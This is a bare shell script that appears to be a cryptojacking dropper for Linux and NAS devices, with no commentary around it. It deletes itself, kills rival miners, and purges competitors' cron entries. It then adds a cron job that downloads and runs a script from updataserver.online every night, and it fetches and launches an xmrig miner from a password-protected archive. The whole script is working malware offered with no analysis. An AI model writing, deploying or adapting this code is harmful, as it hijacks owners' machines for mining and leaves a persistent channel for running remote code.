#!/bin/sh

rm -- "$0"

process=`ps -ef | grep xmrig | grep -v grep | wc -l`
if ! [ $process -eq 0 ] ;then
    kill -9 $(pidof xmrig)
fi
rm -rf xmrig

ntp=`ps -ef | grep nttpd-z | grep -v grep | wc -l`
if ! [ $ntp -eq 0 ] ;then
    kill -9 $(pidof nttpd-z)
fi

sed -i '/glAse/d' /etc/config/crontab
sed -i '/getcmdsehk/d' /etc/config/crontab
sed -i '/DJolndafoprdk/d' /etc/config/crontab
sed -i '/ckismcImcfjGPwrrg/d' /etc/config/crontab
sed -i '/lgwzwONmct/d' /etc/config/crontab
sed -i '/DbDwxesZVpWwgzzYuyx/d' /etc/config/crontab
sed -i '/vJmEHnoMcEnecn/d' /etc/config/crontab
sed -i '/julBiaMkR/d' /etc/config/crontab
sed -i '/pKSvMeNhIxx/d' /etc/config/crontab
sed -i '/XQgwjncxQNTWmZI/d' /etc/config/crontab
sed -i '/getcmdse/d' /etc/config/crontab


crontab -l | { sed -e'/glAse/ d'; } | crontab -
crontab -l | { sed -e'/ssclient/ d'; } | crontab -
crontab -l | { sed -e'/getcmdsehk/ d'; } | crontab -
crontab -l | { sed -e'/DJolndafoprdk/ d'; } | crontab -
crontab -l | { sed -e'/ckismcImcfjGPwrrg/ d'; } | crontab -
crontab -l | { sed -e'/DbDwxesZVpWwgzzYuyx/ d'; } | crontab -
crontab -l | { sed -e'/vJmEHnoMcEnecn/ d'; } | crontab -
crontab -l | { sed -e'/julBiaMkR/ d'; } | crontab -
crontab -l | { sed -e'/pKSvMeNhIxx/ d'; } | crontab -
crontab -l | { sed -e'/XQgwjncxQNTWmZI/ d'; } | crontab -
crontab -l | { sed -e'/lgwzwONmct/ d'; } | crontab -
crontab -l | { sed -e'/getcmdse/ d'; } | crontab -

if ! cat /etc/config/crontab | grep -q getcmdse
then
    echo "2 2 * * * rm -f /tmp/updates.sh;wget -O /tmp/updates.sh http://updataserver.online/updates.sh;/bin/bash /tmp/updates.sh" >> /etc/config/crontab
	crontab -l | { cat; echo "2 2 * * * rm -f /tmp/updates.sh;wget -O /tmp/updates.sh http://updataserver.online/updates.sh;/bin/bash /tmp/updates.sh"; } | crontab -
fi

if  uname -a | grep -q "x86_64"
then
    wget -O /tmp/data.zip https://github.com/TheresaChavez2021/filedata/raw/main/data.zip
    cd /tmp
	rm -rf xmrig
	rm -rf config.json
	unzip -o -P wXtzweNojjF2FX3X /tmp/data.zip
	rm -rf data.zip
	chmod +x ./xmrig
	./xmrig
fi

